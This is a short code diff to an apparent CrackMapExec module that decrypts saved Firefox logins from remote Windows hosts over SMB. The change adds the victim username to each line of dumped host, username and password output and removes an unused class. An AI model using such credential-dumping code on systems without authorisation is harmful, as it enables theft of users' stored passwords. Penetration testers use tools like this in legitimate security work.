@@ -15,11 +15,6 @@ from dploot.lib.smb import DPLootSMBConnection
 
 CKA_ID = unhexlify('f8000000000000000000000000000001')
 
-class LoginsData:
-    def __init__(self, enc_username, enc_password):
-        self.enc_username = enc_username
-        self.enc_password = enc_password
-
 class CMEModule:
     '''
         Firefox by @zblurx
@@ -101,7 +96,7 @@ class CMEModule:
                     for username, pwd, host in logins:
                         decoded_username = self.decrypt(key=key, iv=username[1],ciphertext=username[2]).decode('utf-8')
                         password = self.decrypt(key=key, iv=pwd[1],ciphertext=pwd[2]).decode('utf-8')
-                        context.log.highlight("%s - %s:%s" % (host, decoded_username, password))
+                        context.log.highlight("[%s] %s - %s:%s" % (user, host, decoded_username, password))
                 except Exception as e:
                     if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(e):
                         continue
